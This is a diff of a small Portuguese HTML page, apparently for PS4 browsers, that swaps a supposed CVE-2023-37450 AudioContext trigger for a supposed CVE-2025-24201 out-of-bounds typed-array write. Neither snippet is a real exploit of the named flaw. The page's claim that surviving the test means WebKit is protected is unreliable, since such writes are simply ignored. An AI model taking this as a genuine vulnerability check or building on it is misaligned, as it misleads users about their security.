@@ -2,49 +2,45 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>Teste PS4 WebKit</title>
+  <title>Teste CVE-2025-24201</title>
   <style>
     body {
-      background: #111;
-      color: #0f0;
+      background: black;
+      color: lime;
       font-family: monospace;
-      padding: 2rem;
       text-align: center;
+      padding: 2rem;
     }
     button {
+      background: lime;
+      color: black;
       padding: 1rem 2rem;
       font-size: 1.2rem;
-      background: #0f0;
-      color: #000;
       border: none;
       border-radius: 8px;
       cursor: pointer;
     }
-    button:hover {
-      background: #0c0;
-    }
   </style>
 </head>
 <body>
-  <h1>Detector de Navegador PS4</h1>
-  <p id="info">Clique no botão abaixo para executar o teste de WebKit (CVE-2023-37450).</p>
-
-  <button onclick="runExploitTest()">Executar Teste CVE-2023-37450</button>
+  <h1>Teste CVE-2025-24201</h1>
+  <p id="status">Clique abaixo para iniciar o teste de overflow.</p>
+  <button onclick="trigger()">Rodar Teste</button>
 
   <script>
-    function runExploitTest() {
-      document.getElementById("info").innerHTML = "Executando teste... aguarde.";
-
-      let iframe = document.createElement("iframe");
-      iframe.srcdoc = `<script>
-        let audio = new AudioContext();
-        for (let i = 0; i < 10000; i++) {
-          try {
-            audio.close();
-          } catch (e) {}
-        }
-      <\/script>`;
-      document.body.appendChild(iframe);
+    function trigger() {
+      document.getElementById("status").innerText = "Executando tentativa de gravação fora dos limites...";
+      try {
+        let ab = new ArrayBuffer(8);
+        let view = new BigUint64Array(ab);
+        // Acesso normal
+        view[0] = 123n;
+        // Acesso fora dos limites
+        view[1000000] = 0x41414141n;
+        document.getElementById("status").innerText = "Teste executado. Se não travou, o WebKit pode estar protegido.";
+      } catch (e) {
+        document.getElementById("status").innerText = "Erro capturado: " + e.message;
+      }
     }
   </script>
 </body>
